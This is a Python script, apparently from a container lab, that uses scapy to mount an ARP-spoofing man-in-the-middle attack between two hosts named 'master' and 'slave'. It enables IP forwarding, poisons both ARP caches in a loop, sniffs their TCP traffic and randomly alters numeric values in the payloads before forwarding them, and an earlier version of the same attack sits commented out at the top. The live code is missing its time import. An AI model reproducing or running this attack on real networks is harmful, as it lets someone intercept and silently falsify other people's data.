# from scapy.all import *
# import random
# import logging
# import os
# import socket
# import subprocess
# import time

# logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# def get_ip_address(hostname):
#     try:
#         ip_add = socket.gethostbyname(hostname)
#         return ip_add
#     except socket.gaierror:
#         logging.error(f"Could not resolve hostname: {hostname}")
#         return None

# SENDER_NAME = os.environ.get('SENDER_NAME', 'master')
# RECEIVER_NAME = os.environ.get('RECEIVER_NAME', 'slave')

# SENDER_IP = get_ip_address(SENDER_NAME)
# print(SENDER_IP)
# RECEIVER_IP = get_ip_address(RECEIVER_NAME)
# print(RECEIVER_IP)
# ATTACKER_MAC ="02:42:ac:11:00:02"

# print(f"SENDER_NAME: {SENDER_NAME}, SENDER_IP: {SENDER_IP}")
# print(f"RECEIVER_NAME: {RECEIVER_NAME}, RECEIVER_IP: {RECEIVER_IP}")


# if not SENDER_IP or not RECEIVER_IP or not ATTACKER_MAC:
#     logging.error("Failed to resolve IP addresses or get MAC address. Exiting.")
#     exit(1)

# def modify_data(payload):
#     try:
#         values = payload.decode().strip().split('\n')
#         modified_values = []
#         for value in values:
#             if random.random() < 0.2:
#                 modified_value = str(int(value) + random.randint(-2, 2))
#                 logging.info(f"Modified value: {value} -> {modified_value}")
#                 modified_values.append(modified_value)
#             else:
#                 modified_values.append(value)
#         return '\n'.join(modified_values).encode()
#     except:
#         return payload

# def arp_spoof(target_ip, gateway_ip, attacker_mac):
#     target_mac = getmacbyip(target_ip)
#     print(target_mac)
#     # gateway_mac = getmacbyip(gateway_ip)
#     # print(gateway_mac)
    
#     target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
#     # gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=attacker_mac)
    
#     while True:
#         send(target_packet, verbose=False)
#         # send(gateway_packet, verbose=False)
#         time.sleep(2)

# def packet_callback(packet):
#     if packet.haslayer(IP) and packet.haslayer(Raw):
#         src_ip = packet[IP].src
#         dst_ip = packet[IP].dst
        
#         if src_ip == SENDER_IP and dst_ip == RECEIVER_IP:
#             payload = packet[Raw].load
#             modified_payload = modify_data(payload)
#             packet[Raw].load = modified_payload
#             del packet[IP].chksum
#             del packet[TCP].chksum
#             send(packet, verbose=False)
#         else:
#             # Forward other packets without modification
#             send(packet, verbose=False)

# def mitm_attack():
#     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
#     # Start ARP spoofing in a separate thread
#     import threading
#     arp_thread = threading.Thread(target=arp_spoof, args=(SENDER_IP, RECEIVER_IP, ATTACKER_MAC), daemon=True)
#     arp_thread.start()
    
#     logging.info("ARP spoofing started. Waiting for 5 seconds before capturing packets...")
#     time.sleep(5)  # Wait for ARP spoofing to take effect
    
#     # Start packet sniffing and modification
#     sniff(filter=f"host {SENDER_IP} or host {RECEIVER_IP}", prn=packet_callback, store=0)

# if __name__ == "__main__":
#     mitm_attack()

from scapy.all import *
import random
import logging
import os
import socket

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def get_ip_address(hostname):
    try:
        ip_add=socket.gethostbyname(hostname)
        return ip_add
    except socket.gaierror:
        logging.error(f"Could not resolve hostname: {hostname}")
        return None

SENDER_NAME = os.environ.get('SENDER_NAME', 'master')
HOST = os.environ.get('RECIVER_HOST', 'slave')

SENDER_IP = get_ip_address(SENDER_NAME)
RECEIVER_IP = get_ip_address(HOST)

print(f"SENDER_NAME: {SENDER_NAME}, SENDER_IP: {SENDER_IP}")
print(f"RECEIVER_NAME: {HOST}, RECEIVER_IP: {RECEIVER_IP}")

if not SENDER_IP or not RECEIVER_IP:
    logging.error("Failed to resolve IP addresses. Exiting.")
    exit(1)


def modify_data(payload):

    try:
        values = payload.decode().strip().split('\n')
        modified_values = []
        for value in values:
            if random.random() < 0.2:  # 20% chance to modify a value
                modified_value = str(int(value) + random.randint(-2, 2))
                logging.info(f"Modified value: {value} -> {modified_value}")
                modified_values.append(modified_value)
            else:
                modified_values.append(value)
        return '\n'.join(modified_values).encode()
    except:
        return payload  # Return original payload if modification fails

def arp_spoof(target_ip, gateway_ip):
  
    target_mac = getmacbyip(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(packet, verbose=False)

def packet_callback(packet):
    if packet.haslayer(IP) and packet.haslayer(Raw):
        if packet[IP].src == SENDER_IP and packet[IP].dst == RECEIVER_IP:
            payload = packet[Raw].load
            modified_payload = modify_data(payload)
            packet[Raw].load = modified_payload
            del packet[IP].chksum
            del packet[TCP].chksum
            send(packet, verbose=False)

def mitm_attack():
    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # Start ARP spoofing in a separate thread
    import threading
    threading.Thread(target=arp_spoof_thread, daemon=True).start()

    # Start packet sniffing and modification
    sniff(filter=f"host {SENDER_IP} and host {RECEIVER_IP} and tcp", prn=packet_callback, store=0)

def arp_spoof_thread():
    while True:
        arp_spoof(SENDER_IP, RECEIVER_IP)
        arp_spoof(RECEIVER_IP, SENDER_IP)
        time.sleep(2)

if __name__ == "__main__":
    mitm_attack()
